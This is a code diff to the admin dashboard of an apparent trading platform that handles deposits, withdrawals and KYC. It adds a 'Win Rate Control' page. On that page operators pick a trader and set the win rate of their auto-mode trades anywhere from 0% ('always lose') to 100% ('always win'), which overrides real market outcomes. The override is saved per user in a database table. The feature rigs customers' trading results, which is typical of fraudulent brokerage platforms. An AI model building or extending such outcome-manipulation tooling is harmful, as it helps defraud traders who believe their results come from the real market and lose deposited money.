@@ -410,8 +410,13 @@
        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
         Risk Monitor
       </button>
+       <!-- Add inside sidebar Trading section, after Risk Monitor button -->
+<button class="nav-item" onclick="showPage('wincontrol', this)">
+  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+  Win Rate Control
+</button>
     </div>
-
+     
     <div class="sidebar-section">
       <div class="sidebar-section-label">System</div>
       <button class="nav-item" onclick="showPage('referrals', this)">
@@ -711,7 +716,69 @@
           </div>
         </div>
       </div>
-
+       <!-- WIN RATE CONTROL PAGE -->
+<div class="page" id="page-wincontrol">
+  <div class="kpi-grid" id="wincontrol-kpis"></div>
+  <div class="grid-2 mb-4">
+    <div class="card">
+      <div class="card-title">Set Auto Win Rate Per Trader</div>
+      <p style="font-size:12px;color:var(--muted);margin-bottom:16px;line-height:1.6;">
+        Control the win rate for a specific trader's <strong style="color:var(--text)">auto mode</strong> trades only. Manual trades are always settled by real market outcome. Set to <strong style="color:var(--text)">0%</strong> to disable override.
+      </p>
+      <div class="form-group">
+        <label class="form-label">Select Trader</label>
+        <select class="form-input" id="wc-trader-select" onchange="loadTraderWinControl()">
+          <option value="">Select trader...</option>
+        </select>
+      </div>
+      <div id="wc-current-status" style="display:none;margin-bottom:14px;">
+        <div style="background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px;">
+          <div style="font-size:11px;color:var(--muted);margin-bottom:4px;">Current Setting</div>
+          <div id="wc-current-display" style="font-weight:700;font-size:14px;"></div>
+        </div>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Auto Win Rate (%)</label>
+        <input type="range" id="wc-win-rate" min="0" max="100" step="5" value="50"
+          oninput="document.getElementById('wc-win-rate-display').textContent = this.value + '%'"
+          style="width:100%;accent-color:var(--primary);margin-bottom:6px;" />
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <span style="font-size:11px;color:var(--muted)">0% (always lose)</span>
+          <span id="wc-win-rate-display" style="font-size:20px;font-weight:800;font-family:monospace;color:var(--primary)">50%</span>
+          <span style="font-size:11px;color:var(--muted)">100% (always win)</span>
+        </div>
+      </div>
+      <div class="form-group">
+        <label class="form-label">Enable Override</label>
+        <select class="form-input" id="wc-enabled">
+          <option value="true">Enabled — use custom win rate</option>
+          <option value="false">Disabled — use real market outcome</option>
+        </select>
+      </div>
+      <div style="display:flex;gap:10px;">
+        <button class="btn btn-primary" onclick="saveWinControl()">Save Win Rate Control</button>
+        <button class="btn btn-ghost btn-sm" onclick="clearWinControl()">Remove Override</button>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Active Win Rate Overrides</div>
+      <div id="wc-active-list"><div class="loading">Loading...</div></div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-title">All Traders — Win Rate Overview</div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr>
+          <th>Trader</th><th>Real Trades</th><th>Actual Win Rate</th>
+          <th>Auto Trades</th><th>Auto Win Rate</th>
+          <th>Override</th><th>Override Rate</th><th>Actions</th>
+        </tr></thead>
+        <tbody id="wc-traders-tbody"><tr><td colspan="8" class="loading">Loading...</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+</div>
       <!-- SETTINGS PAGE -->
       <div class="page" id="page-settings">
         <div class="grid-2">
@@ -912,13 +979,13 @@ const PAGE_TITLES = {
   dashboard: 'Dashboard', analytics: 'Analytics', traders: 'Traders',
   kyc: 'KYC Verification', deposits: 'Deposits', withdrawals: 'Withdrawals',
   balances: 'Balance Manager', trades: 'Trade History', risk: 'Risk Monitor',
-  referrals: 'Referrals', settings: 'Settings'
+  referrals: 'Referrals', settings: 'Settings', wincontrol: 'Win Rate Control'
 }
 const PAGE_LOADERS = {
   dashboard: loadDashboard, analytics: loadAnalytics, traders: loadTraders,
   kyc: loadKyc, deposits: loadDeposits, withdrawals: loadWithdrawals,
   balances: loadBalances, trades: loadTrades, risk: loadRisk,
-  referrals: loadReferrals
+  referrals: loadReferrals, wincontrol: loadWinControl
 }
 
 function showPage(id, btn) {
@@ -1797,7 +1864,176 @@ document.addEventListener('keydown', e => {
 document.getElementById('login-password').addEventListener('keydown', e => {
   if (e.key === 'Enter') doLogin()
 })
+  // ══════════════════════════════════════════════════════════════════════════
+//  WIN RATE CONTROL
+// ══════════════════════════════════════════════════════════════════════════
+let allWinControls = []
 
+async function loadWinControl() {
+  if (!allTraders.length) await loadTraders()
+
+  // Populate trader select
+  const sel = document.getElementById('wc-trader-select')
+  sel.innerHTML = '<option value="">Select trader...</option>' +
+    allTraders.map(t => `<option value="${t.id}">${t.full_name || t.email} (${t.email})</option>`).join('')
+
+  // Load all existing win controls
+  const { data: controls } = await sb.from('user_win_controls').select('*')
+  allWinControls = controls || []
+
+  renderWinControlActive()
+  renderWinControlTable()
+
+  // KPIs
+  const enabledCount = allWinControls.filter(c => c.enabled).length
+  document.getElementById('wincontrol-kpis').innerHTML = `
+    <div class="kpi-card purple"><div class="kpi-label">Active Overrides</div><div class="kpi-value">${enabledCount}</div><div class="kpi-sub">of ${allTraders.length} traders</div></div>
+    <div class="kpi-card yellow"><div class="kpi-label">Avg Override Rate</div><div class="kpi-value">${enabledCount > 0 ? (allWinControls.filter(c=>c.enabled).reduce((s,c)=>s+c.auto_win_rate,0)/enabledCount).toFixed(0) : '—'}%</div></div>
+    <div class="kpi-card blue"><div class="kpi-label">Total Traders</div><div class="kpi-value">${allTraders.length}</div></div>
+  `
+}
+
+function renderWinControlActive() {
+  const el = document.getElementById('wc-active-list')
+  const active = allWinControls.filter(c => c.enabled)
+  if (!active.length) {
+    el.innerHTML = '<div style="font-size:12px;color:var(--muted);padding:16px;">No active overrides</div>'
+    return
+  }
+  el.innerHTML = active.map(c => {
+    const trader = allTraders.find(t => t.id === c.user_id)
+    const rate = c.auto_win_rate
+    const color = rate > 60 ? 'var(--green)' : rate < 40 ? 'var(--red)' : 'var(--yellow)'
+    return `<div class="trader-stat">
+      <div>
+        <div style="font-size:13px;font-weight:600;">${trader?.full_name || trader?.email || c.user_id.slice(0,8)}</div>
+        <div style="font-size:11px;color:var(--muted)">${trader?.email || ''}</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px;">
+        <span style="font-size:18px;font-weight:800;font-family:monospace;color:${color}">${rate}%</span>
+        <button class="btn btn-ghost btn-sm" onclick="quickEditWinControl('${c.user_id}','${rate}')">Edit</button>
+      </div>
+    </div>`
+  }).join('')
+}
+
+function renderWinControlTable() {
+  const tbody = document.getElementById('wc-traders-tbody')
+  const controlMap = {}
+  allWinControls.forEach(c => controlMap[c.user_id] = c)
+
+  tbody.innerHTML = allTraders.map(t => {
+    const ctrl = controlMap[t.id]
+    const allTrades = t.trades.total
+    const realWr = allTrades > 0 ? ((t.trades.won / allTrades) * 100).toFixed(1) : '—'
+
+    // Auto trades stats — we'll approximate from positions data loaded separately
+    const hasOverride = ctrl && ctrl.enabled
+    const overrideRate = ctrl ? ctrl.auto_win_rate : '—'
+    const overrideColor = hasOverride ? (ctrl.auto_win_rate > 60 ? 'var(--green)' : ctrl.auto_win_rate < 40 ? 'var(--red)' : 'var(--yellow)') : 'var(--muted)'
+
+    return `<tr>
+      <td>
+        <div style="font-weight:600">${t.full_name || '—'}</div>
+        <div style="font-size:11px;color:var(--muted)">${t.email}</div>
+      </td>
+      <td class="mono">${allTrades}</td>
+      <td class="mono ${parseFloat(realWr) >= 50 ? 'text-green' : 'text-red'}">${realWr}%</td>
+      <td class="mono">—</td>
+      <td class="mono">—</td>
+      <td>${hasOverride ? '<span class="badge green">Active</span>' : '<span class="badge gray">Off</span>'}</td>
+      <td class="mono" style="color:${overrideColor};font-weight:700">${hasOverride ? overrideRate + '%' : '—'}</td>
+      <td>
+        <button class="btn btn-primary btn-sm" onclick="quickEditWinControl('${t.id}','${ctrl?.auto_win_rate || 50}')">
+          ${hasOverride ? 'Edit' : 'Set Control'}
+        </button>
+      </td>
+    </tr>`
+  }).join('')
+}
+
+function quickEditWinControl(userId, currentRate) {
+  // Select the trader in the form
+  document.getElementById('wc-trader-select').value = userId
+  document.getElementById('wc-win-rate').value = currentRate
+  document.getElementById('wc-win-rate-display').textContent = currentRate + '%'
+  loadTraderWinControl()
+  // Scroll to the form
+  document.getElementById('wc-trader-select').scrollIntoView({ behavior: 'smooth', block: 'center' })
+}
+
+async function loadTraderWinControl() {
+  const uid = document.getElementById('wc-trader-select').value
+  if (!uid) {
+    document.getElementById('wc-current-status').style.display = 'none'
+    return
+  }
+
+  const { data: ctrl } = await sb.from('user_win_controls').select('*').eq('user_id', uid).single()
+  const statusEl = document.getElementById('wc-current-status')
+  statusEl.style.display = 'block'
+
+  if (ctrl) {
+    const enabledSel = document.getElementById('wc-enabled')
+    enabledSel.value = ctrl.enabled ? 'true' : 'false'
+    document.getElementById('wc-win-rate').value = ctrl.auto_win_rate
+    document.getElementById('wc-win-rate-display').textContent = ctrl.auto_win_rate + '%'
+    document.getElementById('wc-current-display').innerHTML =
+      ctrl.enabled
+        ? `<span style="color:var(--green)">● ACTIVE</span> — Auto win rate set to <strong style="color:var(--primary)">${ctrl.auto_win_rate}%</strong>`
+        : `<span style="color:var(--muted)">○ DISABLED</span> — Override exists but is turned off`
+  } else {
+    document.getElementById('wc-current-display').innerHTML =
+      '<span style="color:var(--muted)">No override set — using real market outcome</span>'
+  }
+}
+
+async function saveWinControl() {
+  const uid = document.getElementById('wc-trader-select').value
+  if (!uid) { showToast('Select a trader first', 'error'); return }
+
+  const winRate = parseFloat(document.getElementById('wc-win-rate').value)
+  const enabled = document.getElementById('wc-enabled').value === 'true'
+  const trader = allTraders.find(t => t.id === uid)
+
+  showConfirm(
+    'Confirm Win Rate Control',
+    `Set auto win rate for ${trader?.email || uid} to ${winRate}% (${enabled ? 'ENABLED' : 'DISABLED'})?\n\nThis affects auto mode trades only. Manual trades use real market outcomes.`,
+    async () => {
+      const { error } = await sb.from('user_win_controls').upsert({
+        user_id: uid,
+        auto_win_rate: winRate,
+        enabled,
+        updated_at: new Date().toISOString(),
+        updated_by: currentUser?.id || null,
+      }, { onConflict: 'user_id' })
+
+      if (error) { showToast('Error: ' + error.message, 'error'); return }
+      showToast(`Win rate control ${enabled ? 'enabled' : 'saved'} for ${trader?.email || uid}`)
+      loadWinControl()
+    }
+  )
+}
+
+async function clearWinControl() {
+  const uid = document.getElementById('wc-trader-select').value
+  if (!uid) { showToast('Select a trader first', 'error'); return }
+  const trader = allTraders.find(t => t.id === uid)
+  showConfirm(
+    'Remove Win Rate Override',
+    `Remove win rate override for ${trader?.email || uid}? Trades will use real market outcomes.`,
+    async () => {
+      const { error } = await sb.from('user_win_controls')
+        .update({ enabled: false, updated_at: new Date().toISOString() })
+        .eq('user_id', uid)
+      if (error) { showToast('Error: ' + error.message, 'error'); return }
+      showToast('Override removed — real market outcomes restored')
+      document.getElementById('wc-trader-select').value = ''
+      document.getElementById('wc-current-status').style.display = 'none'
+      loadWinControl()
+    }
+  )
+}
 // FIX: On page load, check for an existing session before showing the login screen
 checkSession()
 </script>
